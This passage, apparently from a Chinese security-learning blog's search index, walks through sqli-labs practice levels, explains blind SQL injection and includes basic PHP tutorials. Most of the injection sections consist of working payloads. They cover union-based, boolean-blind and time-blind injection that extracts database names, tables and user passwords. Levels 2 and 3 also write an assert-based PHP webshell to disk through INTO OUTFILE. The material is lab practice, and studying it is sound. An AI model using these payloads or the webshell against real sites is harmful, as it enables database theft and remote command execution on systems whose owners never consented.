1uname=admin&#x27;&amp;passwd=&amp;submit=Submit 此时将’改为 &quot;,’),&quot;) 都不报错 1uname=admin&#x27; and sleep(2) #&amp;passwd=&amp;submit=Submit 此时页面延迟两秒刷新成功，说明为单引号闭合 1uname=admin&#x27;#&amp;passwd=&amp;submit=Submit 此时页面显示登录成功，说明确实为单引号闭合 后续手工注入 payload 就不一一列举出来了 12//获取当前数据库第一个字母为suname=admin&#x27; and if(left((select database()),1)=&#x27;s&#x27;,sleep(2),0) #&amp;passwd=&amp;submit=Submit # sqli-labs-16 1uname=admin&quot;)#&amp;passwd=&amp;submit=Submit 此时登录成功说明为 &quot;) 闭合 手工注入的 payload 与 15 关没什么区别，就不一一列举了 盲注手工注入花费的时间有点久，可以用 sqlmap 来跑","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://dr4x3zz.github.io/categories/sqli-labs/"}],"tags":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://dr4x3zz.github.io/tags/sqli-labs/"}]},{"title":"sqli-labs-9-10","slug":"sqli-labs-9-10","date":"2023-01-06T05:01:32.000Z","updated":"2023-01-07T04:10:22.000Z","comments":true,"path":"2023/01/06/sqli-labs-9-10/","link":"","permalink":"https://dr4x3zz.github.io/2023/01/06/sqli-labs-9-10/","excerpt":"# sqli-labs-9-10","text":"# sqli-labs-9-10 # sqli-labs-9 输入正确的 id 1url?id=1 页面显示 You are in… 无回显 我们现在 id=1 后面加个单引号’，&quot;,’),&quot;) 页面都为正常 无法获取语法错误，这时候就要使用时间注入 payload 如下： 1url?id=1&#x27; and sleep(5) --+ 可以看到页面会延迟 5s 刷新 说明这是单引号闭合 后续的手工注入 payload 如下： 12345678//获取所有数据库名称url?id=1&#x27; and left((select schema_name from information_schema.schemata limit 0,1),5)=&#x27;mysql&#x27; --+ //查出来本地的第一个数据库为mysql//获取security数据库下的所有表名?id=1&#x27; and left((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1)&gt;&#x27;a&#x27; --+//获取security数据库users表下的所有列名?id=1&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 0,1),1)&gt;&#x27;a&#x27; --+//获取所有username和password?id=1&#x27; and left((select username from users limit 0,1),1)&gt;&#x27;a&#x27; --+ 手工注入的效率有点慢，也可以使用 sqlmap 来跑 # sqli-labs-10 输入正确的 id 1url?id=1 页面显示 You are in… 页面不回显 在 id=1 后面添加’,&quot;,’),&quot;) 发现页面显示仍然正常，这时候就要使用时间注入 1url?id=1&quot; and sleep(5) --+ 页面会延迟 5s，说明这是双引号闭合 后续手工注入 payload 和 sqli-labs-9 的一样，把第九关的单引号改为双引号就行了","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://dr4x3zz.github.io/categories/sqli-labs/"}],"tags":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://dr4x3zz.github.io/tags/sqli-labs/"}]},{"title":"SQL盲注","slug":"SQL盲注","date":"2022-12-25T06:37:01.000Z","updated":"2022-12-25T07:21:54.000Z","comments":true,"path":"2022/12/25/SQL盲注/","link":"","permalink":"https://dr4x3zz.github.io/2022/12/25/SQL%E7%9B%B2%E6%B3%A8/","excerpt":"# SQL 盲注","text":"# SQL 盲注 # 盲注介绍 在 SQL 注入过程中，SQL 语句执行查询后，查询数据不能回显到前端页面中，我们需要使用一些特殊的方式来判断或尝试，这个过程成为盲注 盲注的类型有两种： # 布尔注入 布尔有很明显的True和Fales，也就是说它只会根据你的诸如信息返回True和False，也就没有了之前的报错信息 # 时间注入 界面返回值只有一种，True无论输入任何值，返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确 详细内容会在下面展开说 # 需要掌握的几种函数 length () 函数 返回字符串的长度 substr () 截取字符串 （语法：SUBSTR (str,pos,len);） ascii () 返回字符的 ascii 码 [将字符变为数字 wei] sleep () 将程序挂起一段时间 n 为 n 秒 if (expr1,expr2,expr3) 判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句 # length() 这个函数看起来就能理解意思，就是返回字符串的长度 用法就是 1length(database()) = 8 # substr() 这个函数我在 sqli-labs-5 的时候已经提过，用来截取字符串的 详细用法可以去看第五关的博客 # ascii() ASCII 码应该是很熟悉的，在学 C 语言的时候就经常使用到，这里是用作返回字符串的 ASCII 码 用法 1ascii() = 117 有点抽象，第八关的就可以用上 # sleep() 通过执行 select sleep (n) 可以让此语句执行 n 秒 1sleep(n) # if(expr1,expr2,expr3) 判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句 # 补充 我再查找别的网站时发现不仅仅只有上面几个函数，我把刚查阅到的也整理到这里了 # 布尔型 left (a,b) 从左截取 a 的前 b 位：left (database (),1) &gt; ‘s’ substr (a,b,c) 从 b 位置开始，截取字符串 a 的 c 长度 ascii () 将某个字符转换为 ascii 值：ascii (substr (user),1,1)=101# mid (a,b,c) 从位置 b 开始，截取 a 字符串的 c 位 regexp 正则表达式的用法 user () 结果位 root ，regexp 为匹配 root 的正则表达式：select user ()’ # left (a,b) 函数 LEFT () 函数是一个字符串函数，它返回具有指定长度的字符串的左边部分。 LEFT (str,length)；如果 str 或 length 参数为 null，则返回 null。 str 是要提取字符串的字符串、length 是一个正整数，指定将从左边返回的字符数。 length 大于 str 字符串的长度，则 LEFT 返回整个 str 字符串 （返回 str 的长度，以字节为单位，一个多字节可算作多字节。） # substr () 或 substring () 函数 SBUSTR (str,pos) 开始的位置，一直截取到最后。 SBUSTR (str，pos，len)；表示从 pos 开始的位置，截取 len 个字符 (空白也算字符)![在这里插入图片描述 SELECT SUBSTRING (‘chinese’,-3); // 倒数第三个字符之后的子字符串 - ese # ord () mid () 函数 函数 ord () 函数返回字符串 str 的最左面字符的 ASCII 代码值 1select ord(字符) 函数 mid () 用于得到字符串的一部分。 1234select mid( &#x27;chinesepeople&#x27;, 5, 3 ) as mid;//结果:eseselect mid( &#x27;chinesepeople&#x27;, 5) as mid;//结果:esepeople # cast () 和 convert () 函数 cast () convert () 函数可用来获取一个类型的值，并生产另一个类型的值。 可转换的类型 二进制，通带 binary 前缀的效果：BINARY 字符型， 可带参数：char () 日期：DATE 时间：time 日期时间型：datetime 浮点型：decimal 整数：signen 无符号整数：unsignen # ifnull () 函数 IFNULL () 意义是当字段 A 是 NULL 时取 B，不是 NULL 取 A # sleep () 或 benchmark () 通过执行 select sleep (n) 可以让此语句执行 n 秒 条件：指定条件的记录存在时才会停止指定的秒数 列如：查询条件为 name='pig’结果表明记录不存在，执行结果为 0 # 时间注入 # 基于时间的盲注在使用延迟函数上可以有两个选择： benchmark (count，expr) 函数 sleep (time) 函数 前者通过将 expr 语句执行 count 次来到达延迟的目的，后者是直接延迟 time 时间 benchmark 是一个内置函数，其作用是来测试一写函数的执行速度，benchmark（）其中有两个参数， 第一个是执行次数，另一个是要执行的函数或者表达式。 # Xpath 类型函数 (mysql version&gt;= 5.1.5) (1) updatexml () 函数功能：改变文档中符合条件的节点的值。 Updatexml(xml_documnet,XPath_string,new_value)； 第一个参数：XML_document 是 string 格式，为 XML 文档对象的名称 第二个参数：XPath_string (Xpath 格式的字符串) 第三个参数：new_value，string 格式，替换查找到的符合条件的数据超过长度可以配合 substr () # extractvalue() 函数功能：对 XML 文档进行查询的函数，其实就是相当于 HTML 文件中标签查找元素。 语法：extractvalue (目标 XML 文件，XML 路径) 第二个参数 xml 中位置是可以操作的地方，xml 文档中查找字符位置是用 /xxx/xxx/xxx… 这种格式，如果写入其他格式，就会报错，并且会返回写入的非法格式内容，而这个非法内容就是号想要查询的内容 # 盲注实战 # 布尔盲注 # 手工注 1、判断注入点 and -1=-1 页面返回有数据 and -1=-2 页面无结果返回 ==》存在 SQL 注入。 2、判断当前页面字段总数 and -1=-1 order by 2 页面返回有数据 and -1=-2 order by 3 页面无结果返回 ==》当前页面字段数为：2。 3、判断显示位 and -1=-2 union select 1,2 页面无结果返回 ==》无回显点，应该是：盲注并且是布尔盲注（有明显的 True 和 Flash）。 4、猜解当前数据库名称长度 and (length (database ()))&gt;11 页面返回有数据 and (length (database ()))&gt;12 页面无结果返回 ==》当前数据库名称长度为：12。 5、用 ASCII 码猜解当前数据库名称 and ascii (substr (database (),1,1))=107 页面返回有数据 and ascii (substr (database (),2,1))=97 页面返回有数据 ==》当前数据库 第一个字母是 k, 第二个字母是 a… 以此类推得到数据库库名是 kanwolonxia。 注：判断 ascii 码范围不止是 ”=&quot; 哦，还应该恰当使用 “&gt;”,“&lt;” 等符号。 6、猜表名 and (ascii (substr ((select table_name from information_schema.tables where table_schema=database () limit 0,1),1,1)))=108 页面返回有数据 ==》表名的 第一个字母是 l … 然后以此类推得到 表名 loflag。 7、猜字段名 and (ascii (substr ((select column_name from information_schema.columns where table_name=‘loflag’ limit 1,1),1,1)))=102 页面返回有数据 ==》字段名的第一个字母是 f… 类推得到字段名 flaglo。 8、猜内容 and (ascii (substr (( select flaglo from loflag limit 0,1),1,1)))=122 页面返回有数据 ==》得到数据的第一个字母是 z… 类推得到 数据 zKaQ-QQQ # burp 跑盲注 # sqlmap 跑布尔盲注 基础命令： -u 指定注入点 –dbs 跑库名 –tables 跑表名 –columns 跑字段名 –dump 枚举数据 -D 指定库 -T 指定表 -C 指定字段 这两种盲注还需要学习一下，后续在做归纳 # 时间盲注 1、判断注入点 &quot;and -1=-1-- w 页面返回有数据 &quot;and -1=-2-- w 页面返回有数据 ==》页面的返回没有变化，可能是盲注； 然后用 sleep () 判断是否是时间盲注 &quot;and sleep (5)-- w 页面延时了 ==》该盲注是时间盲注。 2、猜解当前数据库名称长度 &quot;and if ((length (database ()))=12,sleep (5),1)-- w 页面延时了 ==》当前数据库名称长度为 12。 3、用 ASCII 码猜解当前数据库名称 &quot;and if (ascii (substr (database (),1,1))=107,sleep (5),1)-- w 页面延时了 ==》数据库第一个字母是 k… 类推得到数据库名 kanwolonxia。 后面的跟上面的差不多就是多了一个 if () 函数。 并且用 Burp 和 Salmap 的方法也都类似。 延时盲注其实和布尔盲注其实没有什么太大的区别，只不过是一个依靠页面是否正常判断，一个是否延时判断，在操作上其实也差不多，只不过延时多一个 if ()。","categories":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://dr4x3zz.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://dr4x3zz.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"php学习2022-12-24","slug":"php学习2022-12-24","date":"2022-12-24T03:36:38.000Z","updated":"2022-12-24T05:25:06.000Z","comments":true,"path":"2022/12/24/php学习2022-12-24/","link":"","permalink":"https://dr4x3zz.github.io/2022/12/24/php%E5%AD%A6%E4%B9%A02022-12-24/","excerpt":"# php 学习 (array)","text":"# php 学习 (array) # 数值数组数组 # 自动分配 ID 第一种方法是自动分配 ID 键，和 C 语言一样都是从 0 开始分配 ID 代码如下： 12345&lt;?php $color = array( &quot;red&quot;, &quot;blue&quot;, &quot;green&quot; ); echo &quot;I like&quot; . &quot; &quot; . $color[0] . &quot;,&quot; . $color[1] . &quot;,&quot; . $color[2] . &quot;.&quot;; //输出结果：I like red,blue,green.?&gt; # 直接创建 第二种方法是直接创建 代码如下： 12345678&lt;?php $phone[0] = &quot;vivo&quot;; $phone[1] = &quot;Redmi&quot;; $phone[2] = &quot;iphone&quot;; echo &quot;I like&quot; . &quot; &quot; . $phone[0] . &quot;,&quot; . $phone[1] . &quot;,&quot; . $phone[2] . &quot;.&quot;; //输出结果：I like vivo,Redmi,iphone.?&gt; # count() count () 函数用于返回数组的长度（元素的数量） 1234567&lt;?php $phone[0] = &quot;vivo&quot;; $phone[1] = &quot;Redmi&quot;; $phone[2] = &quot;iphone&quot;; echo count($phone); //输出结果：3?&gt; # 遍历数值数组 遍历并打印数值数组中的所有值 遍历，是指沿着某条搜索路线，依次对树（或图）中每个节点均做一次访问。 12345678910&lt;?php $cars = array( &quot;Volvo&quot;, &quot;BMW&quot;, &quot;Toyota&quot; ); $arrlength = count( $cars ); for($x=0; $x &lt; $arrlength; $x++) &#123; echo $cars[$x]; echo &quot;&lt;br&gt;&quot;; &#125;?&gt; # 关联数组 12345678910&lt;?php $age = array( &quot;Peter&quot; =&gt; &quot;35&quot;, &quot;Ben&quot; =&gt; &quot;37&quot;, &quot;Joe&quot; =&gt; &quot;43&quot; );/* 相当于： $age[&#x27;Peter&#x27;] = &quot;35&quot;; $age[&#x27;Ben&#x27;] = &quot;37&quot;; $age[&#x27;Joe&#x27;] = &quot;43&quot;;*/ echo &quot;Peter is &quot; . $age[&#x27;Peter&#x27;] . &quot; years old.&quot;; //输出：Peter is 35 years old.?&gt; # 遍历关联数组 1234567891011121314&lt;?php $age=array( &quot;Peter&quot;=&gt;&quot;35&quot;, &quot;Ben&quot;=&gt;&quot;37&quot;, &quot;Joe&quot;=&gt;&quot;43&quot; ); foreach( $age as $key =&gt; $key_value ) &#123; echo &quot;Key = &quot; . $key . &quot;, Value = &quot; . $key_value; echo &quot;&lt;br&gt;&quot;; &#125; /* 输出结果： Key = Peter, Value = 35 Key = Ben, Value = 37 Key = Joe, Value = 43 */?&gt; # foreach 循环 foreach 是一种特殊的循环语句，只适用于数组和对象。 foreach 可以以两种方式使用。 # 用法一： 1234foreach ( $array as $value )&#123; // (对于$value执行的语句) &#125; 例如： 123456789&lt;?php $authors = array( &quot;Java&quot;, &quot;PHP&quot;, &quot;CSS&quot;, &quot;HTML&quot; ); foreach ( $authors as $value ) &#123; echo $value; echo &quot;&lt;br&gt;&quot;; &#125; ?&gt; 输出结果： Java PHP CSS HTML # 用法二： 1234foreach ( $array as $key =&gt; $value )&#123; // (对$key and/or $value执行的语句)&#125; 例如： 1234567891011121314&lt;?php$myBook = array( &quot;title&quot; =&gt; &quot;Learn PHP from www.w3cschool.cn&quot;, &quot;author&quot; =&gt; &quot;www.w3cschool.cn&quot;, &quot;pubYear&quot; =&gt; 2000 ); foreach ( $myBook as $key =&gt; $value )&#123; echo &quot;$key&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;$value&quot;; echo &quot;&lt;br&gt;&quot;; &#125; ?&gt; 输出结果： title Learn PHP from www.w3cschool.cn author www.w3cschool.cn pubYear 2000 # 使用 foreach 更改数组值 当使用 foreach 时，循环中的值是值的副本。 如果你改变了值，你 “不影响值在原始数组中。 例如： 123456789101112&lt;?php$authors = array( &quot;Java&quot;, &quot;PHP&quot;, &quot;CSS&quot;, &quot;HTML&quot; ); // Displays &quot;Java PHP Javascript HTML&quot;; foreach ( $authors as $val )&#123; if ( $val == &quot;CSS&quot; ) $val = &quot;Javascript&quot;; echo $val . &quot; &quot;; &#125; print_r ( $authors ); //print_r()函数用于打印变量?&gt; 输出结果为： Java PHP Javascript HTML Array ( [0] =&gt; Java [1] =&gt; PHP [2] =&gt; CSS [3] =&gt; HTML ) 虽然 $ val 在循环中从 “CSS&quot;改为 “Javascript&quot; 原始的 $ authors 数组保持不变。 要修改数组值，我们需要得到 foreach () 返回一个引用数组中的值，而不是副本。 添加一个在 foreach 语句中的变量名之前的 &amp; (和号) 符号 : 1234foreach ( $array as &amp; $value ) &#123;&#125; 例如： 123456789&lt;?php $authors = array( &quot;Java&quot;, &quot;PHP&quot;, &quot;CSS&quot;, &quot;HTML&quot; ); foreach ( $authors as &amp; $val ) &#123; if ( $val == &quot;CSS&quot; ) $val = &quot;Javascript&quot;; echo $val . &quot; &quot;; &#125; unset( $val ); //unset()销毁指定的变量。 print_r ( $authors ); ?&gt; 输出结果： Java PHP Javascript HTML Array ( [0] =&gt; Java [1] =&gt; PHP [2] =&gt; Javascript [3] =&gt; HTML ) 这一次，成功将第三个元素的值在数组本身中从 “CSS&quot;更改为 “Javascript&quot;。 注意 unset ($ val) 确保 $ val 变量在循环已完成。 当循环结束时，$ val 仍然保存对最后一个元素的引用。在我们的代码中更改 $ val 改变 $ authors 数组的最后一个元素。通过取消设置 $ val，我们避免潜在的错误。","categories":[{"name":"php学习","slug":"php学习","permalink":"https://dr4x3zz.github.io/categories/php%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://dr4x3zz.github.io/tags/php%E5%AD%A6%E4%B9%A0/"}]},{"title":"php学习2022-12-22","slug":"php学习2022-12-22","date":"2022-12-22T12:54:01.000Z","updated":"2022-12-24T04:18:28.000Z","comments":true,"path":"2022/12/22/php学习2022-12-22/","link":"","permalink":"https://dr4x3zz.github.io/2022/12/22/php%E5%AD%A6%E4%B9%A02022-12-22/","excerpt":"# php 学习 (三元运算、if_else、switch)","text":"# php 学习 (三元运算、if_else、switch) # 三元运算 三元运算符的格式：(expr1) ? (expr2) : (expr3) 解释：如果条件”expr1” 成立，则执行语句”expr2”, 否则执行”expr3” 例： 12345&lt;?php $a = 666; echo $a == 777 ? &quot;yes&quot; : &quot;no&quot;; //输出no echo PHP_EOL; //换行符?&gt; 同时，也可以用 if 来写一段作用相同的代码 1234567891011&lt;?php $a = 666; if($a == 666) &#123; echo &quot;yes&quot;; //输出：yes &#125; else &#123; echo &quot;no&quot;; &#125;?&gt; C 语言中，条件的符号用的也是？: 他的用法是 A?B:C 意思是：若 A 为非 0 则值为 B，否则为 C php 和 C 中这个符号的判断顺序还是一样的 # if_else if else 的用法和语法大致都和 C 一样 # if： if（条件） { 条件成立时要执行的代码； } 1234567&lt;?php $tz = 520; if($tz == 520) &#123; echo &quot;czk love ltx&quot;; //输出：czk love ltx &#125;?&gt; # if else if (条件) { 条件成立时执行的代码； } else { 条件不成立时执行的代码； } 1234567891011&lt;?php $kx = 1314; if($kx != 1314) &#123; echo &quot;No!No!No!&quot;; &#125; else &#123; echo &quot;czk like ltx&quot;; //输出：czk like ltx &#125;?&gt; # if ifelse else if (条件) { if 条件成立时执行的代码； } elseif (条件) { elseif 条件成立时执行的代码； } else { 条件不成立时执行的代码； } 123456789101112131415&lt;?php $t = 30; if ($t &lt; &quot;10&quot;) &#123; echo &quot;hello chen&quot;; &#125; elseif ($t &lt; &quot;20&quot;) &#123; echo &quot;hello lin&quot;; &#125; else &#123; echo &quot;hello chen and lin&quot;; //输出：hello chen and lin &#125;?&gt; # switch switch case 语法也和 C 语言相差不大，这里就不给用法了，直接上例子 1234567891011121314&lt;?php $color = &quot;red&quot;; switch ($color) &#123; case &quot;red&quot;: echo &quot;你最喜欢的颜色是红色！&quot;; break; //输出：“你最喜欢的颜色是红色！ case &quot;blue&quot;: echo &quot;你最喜欢的颜色是蓝色！&quot;; break; case &quot;green&quot;: echo &quot;你最喜欢的颜色是绿色！&quot;; break; default: echo &quot;你最喜欢的颜色不是红、蓝、绿其中之一！&quot;; &#125;?&gt;","categories":[{"name":"php学习","slug":"php学习","permalink":"https://dr4x3zz.github.io/categories/php%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://dr4x3zz.github.io/tags/php%E5%AD%A6%E4%B9%A0/"}]},{"title":"sqli-labs-1-8","slug":"sqli-labs-1-8","date":"2022-12-21T12:20:08.000Z","updated":"2023-11-03T16:16:22.000Z","comments":true,"path":"2022/12/21/sqli-labs-1-8/","link":"","permalink":"https://dr4x3zz.github.io/2022/12/21/sqli-labs-1-8/","excerpt":"# sqli-labs-1-8","text":"# sqli-labs-1-8 # SQL 注入 # SQL 注入常用 information_schema：表示所有信息，包括库、表、列 information_schema.tables：记录所有表名信息的表 information_schema.columns：记录所有列名信息的表 table_schema：数据库的名称 table_name: 表名 column_name: 列名 group_concat (): 显示所有查询到的数据 # 哪里存在 SQL 注入？ · GET · POST · HTTP 头部注入 ・ Cookie 注入 # sql 注入的类型 1、字符型注入 2、数字型注入 # MySQL 中 3 种注释风格 ‘#’ （url 编码为 %23） ‘–’ （–后边要跟上一个或多个空格 --+） # 判断注入点 and 1=1 /and 1=2 回显页面不同（整形判断） 若在 GET 请求中？id=1 and 1=1 和？id=1 and 1=2 都没有报错，则是字符型注入。 若在 GET 请求中？id=1 and 1=1 没有报错，但是？id=1 and 1=2 有异常或没回显，则是数字型注入。 单引号判断 ’ 显示数据库错误信息或者页面回显不同（整形，字符串类型判断） # 步骤 # 1、判断列数 order by 1 order by 2 … order by 70 # 2、判断显示位 url?id=-1 union select 1,2,3,4,5 # 3、获取当数据库名称和当前连接数据库的用户 url?id=-1 union select 1,2,databaes(),4,5 url?id=-1 union select 1,2,user(),4,5 # 4、列出所有数据库 limit 一个一个打印出来库名 select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1 group_concat 一次性全部显示 select group_concat (SCHEMA_NAME) from information_schema.SCHEMATA # 5、列出 (数据库：test) 中所有的表 limit 一个一个打印出来字段名 select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=‘test’ limit 0,1 group_concat 一次性全部显示 select group_concat (TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=0x674657374 注意：数据库名称可以用十六进制来代替字符串，这样可以绕过单引号的限制。 # 6、列出（数据库：test 表：admin ）中所有的字段 limit 一个一个打印出来 select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA=‘baji’ and TABLE_NAME=‘users’ limit 0,1 group_concat 一次性全部显示 select group_concat (COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA=0x74657374 and TABLE_NAME=0x61646d696e # 7、列出（数据库：test 表：admin ）中的数据 limit 一个一个打印出来 select username,passwd from test.admin limit 0,1 group_concat 把 一次性全部打印 select group_concat (concat (username,0x20,passwd)) from test.admin network 本文参考参考链接：https://blog.csdn.net/qq_37133717/article/details/93498444 # sqli-labs-1 通过题目的名字 &quot;GET-Error based - Single quotes - String (基于 GET 错误 - 单引号 - 字符串)&quot; 可知，题目是一个单引号引起的字符型 在 url 后面输入？id=1 and 1=1,url?id=1 1=2 后发现页面正常没有不同，考虑为字符型 添加单引号后，页面出现 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘‘1’’ LIMIT 0,1’ at line 1 可以看到存在’' 包装 继续在后面添加–+ url?id=1’ --+ 发现页面异常，存在单引号的注入问题 # 用 order by 猜解列数 1url?id=1&#x27; and 1=2 order 1 --+ 依次使用 order 2 order 3 order 4 页面显示 Unknown column ‘4’ in 'order clause’ 说明一共有三个字段 # 显示回显位 1url?id=1&#x27; and 1=2 union select 1,2,3 --+ 页面显示 Your Login name:2 Your Password:3 得出可显字段为 2 和 3 所以我们查找数据库 1url?id=1&#x27; and 1=2 union select 1,database(),3 --+ 或者 1url?id=1&#x27; and 1=2 union select 1,2,database() --+ 页面显示 Your Login name:security Your Password:3 得出数据库名称为：security # 爆数据 # 查询表名 1url?id=1&#x27; and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; --+ 页面显示 Your Login name:emails,referers,uagents,users Your Password:3 得出表名为 emails,referers,uagents,users # 查询列明 1url?id=1&#x27; and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;security&#x27; --+ 页面显示 Your Login name:id,email_id,id,referer,ip_address,id,uagent,ip_address,username,id,username,password Your Password:3 得出列名为 id,email_id,id,referer,ip_address,id,uagent,ip_address,username,id,username,password # 查询数据 1url?id=1&#x27; and 1=2 union select 1,username,password from users limit 0,1 --+ 这里采用 limit 0,1，因为用 group_concat（）一次爆出多条数据，不方便我们查看相对应的用户名和密码 依次增加 0,1 1,1 2,1 3,1 直至页面无数据显示 将分别得到的内容整合成一个表，如下： username password Dumb Dumb Angelina I-kill-you Dummy p@ssword secure crappy stupid stupidity superman genious batman mob!le admin admin 若想直接爆出所有用户名和密码可以这样写 1?id=-1&#x27; union select 1,group_concat(username),group_concat(password) from users --+ 页面显示 Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin 按顺序对应各自的 username 和 password # sqli-labs-2 # 初步判断 输入？id=1 得出页面回显 1url?id=1 页面显示 Your Login name:Dumb Your Password:Dumb 接着在 url 后添加’ 1url?id=1&#x27; 页面显示 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’ LIMIT 0,1’ at line 1 说明 SQL 语法错误 ‘’ LIMIT 0,1’ at line 1 显示添加后语法中多了一个’，说明本题不需要闭合 用 1=1，1=2 判断为字符还是数字 12url?id=1 and 1=1url?id=1 and 1=2 发现 1=2 异常说明本题为数字型注入 # 查询列数 使用 order 1234url?id=1 and 1=2 order by 1 --+order by 2...url?id=1 and 1=2 order by 4 --+ 这时候页面异常显示 Unknown column ‘4’ in ‘order clause’ 说明只有三列 # 确定哪个字段有回显 使用 union select 联合注入 1url?id=1 and 1=2 union select 1,2,3 --+ 页面显示 Your Login name:2 Your Password:3 得出二三列回显 # 确定当前数据库名称 1url?id=1 and 1=2 union select 1,database(),3 --+ 页面显示 Your Login name:security Your Password:3 得出数据库名称为 security # 得出数据库所有表名 1url?id=1 and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; --+ 页面显示 Your Login name:emails,referers,uagents,users Your Password:3 得出数据库的所有表名为 emails,referers,uagents,users # 得出数据库所有列名 1url?id=1 and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;security&#x27; --+ 页面显示 Your Login name:email_id,id,id,ip_address,referer,id,ip_address,uagent,username,id,password,username Your Password:3 得出所有列名为 email_id,id,id,ip_address,referer,id,ip_address,uagent,username,id,password,username 如果只想获得 uesr 表中的列名，方便我们查找的话，可以继续添加一些内容 1url?id=1 and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;security&#x27; and table_name = &#x27;users&#x27; --+ 页面显示 Your Login name:id,password,username Your Password:3 得出 users 表中的列名为 id,password,username # 得出 users 表中的所有 username 和 password 1url?id=1 and 1=2 union select 1,group_concat(username),group_concat(password) from users --+ 页面显示 Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin 按顺序对应 username 和 password 如果想更好的查看对应的 username 和 password 可以添加 limit 0,1 将 group_concat () 删去 1234url?id=1 and 1=2 union select 1,username,password from users limit 0,1 --+limit 1,1limit 2,1... 通过这样的方法就能得到所有的 username 和 password # 写入 webshell 1url?id=1 and 1=2 union select 1,2,&#x27;&lt;?php assert($_POST[Less2]);?&gt;&#x27; into outfile &#x27;C:/less2.php&#x27; --+ 这样能在 c 盘中找到 less2.php 文件 内容就为 1&lt;?php assert($_POST[Less2]);?&gt; # sqli-labs-3 # 初步判断 # 判断一下是否回显 输入正确的 url 1url?id=1 页面显示 Your Login name:Dumb Your Password:Dumb 说明会回显 # 判断需要闭合什么符号 在 url 后面添加’ 1url?id=1&#x27; 页面显示 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘‘1’’) LIMIT 0,1’ at line 1 说明我们需要闭合一个) # 判断是什么型注入 运用 and 1=1 和 1=2 1url?id=1&#x27;) and 1=2 --+ 此时页面异常，说明是数字型注入 # 获取列数 用 order by 1，order by 2 … 直至 order by 4 此时报错 页面显示 Unknown column ‘4’ in ‘order clause’ 从而可得知列数有三列 # 获取数据库名称 用联合注入 union select 判断哪些字段会回显 1url?id=1&#x27;) and 1=2 union select 1,2,3 --+ 页面显示 Your Login name:2 Your Password:3 得到 2，3 字段会回显后直接用 database () 获取数据库 1?id=1&#x27;) and 1=2 union select 1,database(),3 --+ 页面显示 Your Login name:security Your Password:3 得到数据库名称为 security # 获取所有表名 1url?id=1&#x27;) and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = &#x27;security&#x27; --+ 页面显示 Your Login name:emails,referers,uagents,users Your Password:3 得到数据库的所有表名为 emails,referers,uagents,users # 获取数据库中 users 表的所有列名 1url?id=1&#x27;) and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema = &#x27;security&#x27; --+ 页面显示 Your Login name:email_id,id,id,ip_address,referer,id,ip_address,uagent,username,id,password,username Your Password:3 得到 users 表中的所有列名 # 爆出 users 表中的所有 username 和 password 1url?id=1&#x27;) and 1=2 union select 1,group_concat(username),group_concat(password) from users --+ 页面显示 Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin 依次对应各个 username 和 password # 写入 webshelll 1url?id=1&#x27;) and 1=2 union select 1,2,&#x27;&lt;?php assert($_POST[Less3]);?&gt;&#x27; into outfile &#x27;C:/Less3.php&#x27; --+ 可以在路径中找到 Less3.php，里面的内容为 1&lt;?php assert($_POST[Less3]);?&gt; # sqli-labs-4 # 前言 如果字段本身是 int 类型，并且在查询语句中该字段的值被双引号或者单引号包裹，则只要值是以正确数字开头的，后面接多余的字符还是可以返回正确的查询结果，甚至单引号中可以包含双引号，双引号中可以包含单引号。 如： 1SELECT * FROM users WHERE id = &quot;1&#x27;m&quot; 学习连接：https://blog.csdn.net/elephantxiang/article/details/119684515 # 初步判断 输入正确的 id 1url?id=1 页面显示 Your Login name:Dumb Your Password:Dumb 说明会回显 输入’ 发现页面没有报错 接着输入 &quot; 1url?id=1&quot; 页面显示 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1&quot;”) LIMIT 0,1’ at line 1 由此可知，本题的闭合为 &quot;) 有 and 1=1 和 and1=2 判断是字符型注入还是数字型注入 1url?id=1&quot;) and 1=2 --+ 此时页面显示异常，说明是数字型注入 # 判断列数 order by 1/2/3/4 4 时报错，内容和前三关一致，这里就一一列出 # 判断回显字段 用联合注入 union select 1,2,3，然后 2,3 回显这里也不一一列出了 # 获取数据库名称 